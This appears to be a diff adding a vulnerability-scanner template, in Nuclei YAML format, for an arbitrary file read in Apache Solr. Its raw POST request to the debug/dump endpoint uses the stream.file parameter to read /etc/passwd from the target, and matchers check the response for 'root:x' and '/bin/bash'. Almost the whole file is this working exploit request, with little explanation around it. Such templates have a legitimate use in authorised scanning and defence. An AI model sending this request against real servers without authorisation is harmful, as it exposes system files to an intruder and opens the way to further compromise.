@@ -1,0 +1,33 @@
+id: solr-fileRead
+
+info:
+  name: solr 任意文件读取
+  author: Str1am
+  severity: high
+  tags: solr,fileRead
+
+requests:
+  - raw:
+      - |
+        POST /solr/supplierSearch_V2/debug/dump?param=ContentStreams HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.26.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Length: 27
+        Content-Type: application/x-www-form-urlencoded
+
+        stream.file=%2Fetc%2Fpasswd
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x"
+          - "/bin/bash"
+        part: body
+        condition: and
